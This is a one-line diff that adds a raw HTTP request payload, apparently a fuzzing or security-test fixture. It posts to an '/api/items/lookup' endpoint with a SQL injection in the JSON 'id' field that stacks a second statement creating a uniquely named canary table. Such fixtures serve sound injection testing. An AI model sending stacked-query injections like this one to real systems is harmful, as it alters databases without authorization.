@@ -1,0 +1,1 @@
+payload "POST /api/items/lookup HTTP/1.1\r\nHost: app:8080\r\nContent-Type: application/json\r\nContent-Length: 62\r\nConnection: close\r\n\r\n{\"id\":\"1; CREATE TABLE creep_0123456789abcdef01234567 (); --\"}"
